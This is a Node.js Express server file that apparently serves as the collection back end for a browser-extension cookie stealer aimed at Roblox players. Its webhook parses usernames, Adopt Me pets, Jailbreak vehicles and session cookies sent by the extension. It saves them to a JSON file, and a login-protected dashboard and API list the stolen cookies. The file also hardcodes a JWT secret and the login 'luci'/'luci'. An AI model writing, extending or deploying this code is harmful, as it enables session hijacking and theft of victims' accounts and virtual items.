const express = require('express');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const app = express();

const SECRET = 'luci-secret-change-me';
const VALID_USER = 'luci';
const VALID_PASS = 'luci';
const DATA_FILE = path.join(__dirname, 'data.json');

// CORS headers for dashboard API calls
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Body parsing for standard JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// ===== data helpers =====
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
  } catch (_) {}
  return { jailbreak: [], adoptme: [] };
}

function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// ===== webhook (receives plain text from extension) =====
app.post('/webhook', (req, res) => {
  let body = '';
  req.on('data', chunk => { body += chunk; });
  req.on('end', () => {
    let parsed;
    try {
      parsed = JSON.parse(body);
    } catch (e) {
      return res.status(400).send('Invalid JSON');
    }

    const { content } = parsed;
    if (!content) return res.status(400).send('Missing content');

    const data = loadData();
    const lines = content.split('\n');
    let entry = { timestamp: new Date().toISOString() };
    let type = 'adoptme';

    for (const line of lines) {
      const clean = line.replace(/\*\*/g, '').trim();
      if (clean.startsWith('Username:')) entry.username = clean.split('Username:')[1].trim();
      if (clean.startsWith('Pets:')) { entry.pet = clean.split('Pets:')[1].trim(); type = 'adoptme'; }
      if (clean.startsWith('Vehicle:')) { entry.vehicle = clean.split('Vehicle:')[1].trim(); type = 'jailbreak'; }
      if (clean.startsWith('Cookie:')) {
        const match = clean.match(/\|\|`(.+?)`\|\|/);
        if (match) entry.cookie = match[1];
      }
    }

    if (entry.username && entry.cookie) {
      data[type].push(entry);
      saveData(data);
      console.log(`New ${type} entry from ${entry.username}`);
    } else {
      console.log('Incomplete data received:', body);
    }

    res.status(200).send('OK');
  });
});

// ===== login / dashboard =====
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'login.html')));
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === VALID_USER && password === VALID_PASS) {
    const token = jwt.sign({ user: username }, SECRET, { expiresIn: '8h' });
    res.cookie('auth_token', token, { httpOnly: true, secure: true, sameSite: 'lax' });
    return res.redirect('/dashboard');
  }
  res.redirect('/login?error=1');
});

app.get('/logout', (req, res) => {
  res.clearCookie('auth_token');
  res.redirect('/login');
});

function authMiddleware(req, res, next) {
  const token = req.cookies?.auth_token;
  if (!token) return res.redirect('/login');
  try { jwt.verify(token, SECRET); next(); } catch (_) { res.redirect('/login'); }
}

app.get('/dashboard', authMiddleware, (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));
app.get('/api/cookies', authMiddleware, (req, res) => res.json(loadData()));
app.get('/', (req, res) => res.redirect('/login'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Dashboard running on port ${PORT}`));